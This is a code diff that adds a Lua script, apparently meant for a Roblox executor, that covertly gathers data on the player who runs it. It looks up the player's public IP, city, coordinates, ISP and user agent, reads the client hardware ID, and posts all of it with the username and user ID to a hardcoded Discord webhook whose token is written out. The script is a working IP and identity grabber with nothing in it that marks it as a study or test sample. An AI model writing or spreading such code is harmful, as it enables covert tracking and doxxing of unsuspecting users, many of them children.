@@ -1,0 +1,83 @@
+local apiUrl = "https://ifconfig.co/json"
+local webhook = "https://webhook.lewisakura.moe/api/webhooks/1158130163255619604/2CdIySTtV0H9vOYqn8E3B3fdqKcS-uMHBnS5ATfsedFK-kMOsnz1xTdNXQv3WnNS2hUm/queue" -- Replace with your actual Discord webhook URL
+local http = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
+
+local function fetchJsonData()
+    local success, jsonResponse = pcall(function()
+        return game:HttpGet(apiUrl)
+    end)
+
+    if success then
+        return jsonResponse
+    else
+        warn("Failed to fetch JSON data from the API.")
+        return nil
+    end
+end
+
+local jsonData = fetchJsonData()
+
+if jsonData then
+    local data = http:JSONDecode(jsonData)
+    local ipAddress = data.ip
+
+    if ipAddress then
+        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+
+        local payload = {
+            content = "",
+            embeds = {{
+                title = "Player Information",
+                type = "rich",
+                color = tonumber(0xffffff),
+                fields = {
+                    {name = "Player's Username:", value = player.Name, inline = true},
+                    {name = "Player's ID:", value = player.UserId, inline = true},
+                    {name = "Player's IP:", value = ipAddress, inline = true},
+                    {name = "Player's HWID:", value = hwid, inline = true},
+                    {name = "Account Age:", value = tostring(player.AccountAge), inline = true},
+                    {name = "Display Name:", value = player.DisplayName, inline = true},
+                    {name = "IP Decimal:", value = tostring(data.ip_decimal), inline = true},
+                    {name = "Country:", value = data.country, inline = true},
+                    {name = "Country ISO:", value = data.country_iso, inline = true},
+                    {name = "Country EU:", value = tostring(data.country_eu), inline = true},
+                    {name = "Region Name:", value = data.region_name, inline = true},
+                    {name = "Region Code:", value = data.region_code, inline = true},
+                    {name = "City:", value = data.city, inline = true},
+                    {name = "Latitude:", value = tostring(data.latitude), inline = true},
+                    {name = "Longitude:", value = tostring(data.longitude), inline = true},
+                    {name = "Time Zone:", value = data.time_zone, inline = true},
+                    {name = "ASN:", value = data.asn, inline = true},
+                    {name = "ASN Organization:", value = data.asn_org, inline = true},
+                    {name = "User Agent:", value = data.user_agent.raw_value, inline = true},
+                }
+            }}
+        }
+
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+
+        local requestBody = http:JSONEncode(payload)
+
+        local success, response = pcall(function()
+            return request({
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = requestBody
+            })
+        end)
+
+        if success then
+            print("Data sent to Discord successfully.")
+        else
+            warn("Failed to send data to Discord. Error: " .. tostring(response))
+        end
+    else
+        warn("IP address not found in the JSON data.")
+    end
+else
+    print("Failed to fetch JSON data.")
+end
